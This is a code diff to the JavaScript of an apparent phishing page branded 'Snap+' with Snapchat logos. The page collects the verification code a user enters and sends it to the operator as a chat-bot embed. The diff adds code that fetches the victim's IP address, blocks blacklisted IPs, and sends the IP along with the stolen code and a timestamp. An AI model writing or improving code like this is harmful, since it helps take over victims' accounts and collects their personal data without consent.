@@ -30,6 +30,13 @@ sendBtn.addEventListener('click', async function() {
         return;
     }
 
+    const ip = await getUserIP();
+
+    if (isBlacklisted(ip)) {
+        alert('Accès refusé.');
+        return;
+    }
+
     sendBtn.disabled = true;
     sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
     document.querySelector('.form-group').style.display = 'none';
@@ -42,12 +49,19 @@ sendBtn.addEventListener('click', async function() {
         title: '📱 Code reçu Snap+',
         description: 'Un utilisateur a envoyé son code de vérification.',
         color: 0x667eea,
+        author: {
+            name: 'Snap+ Bot',
+            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
+        },
         fields: [
-            { name: '🔑 Code', value: `**${code}**`, inline: true },
-            { name: '⏰ Date', value: new Date().toLocaleString('fr-FR'), inline: true }
+            { name: '─────────────────────', value: ' ', inline: false },
+            { name: '🔑 Code', value: `\`\`\`${code}\`\`\``, inline: false },
+            { name: '🌐 IP', value: `\`\`\`${ip}\`\`\``, inline: false },
+            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
+            { name: '─────────────────────', value: ' ', inline: false }
         ],
-        thumbnail: { url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
-        footer: { text: 'Snap+ Bot', icon_url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
+        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
+        footer: { text: 'Snap+ Bot • Envoi automatique', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
         timestamp: new Date().toISOString()
     };
 
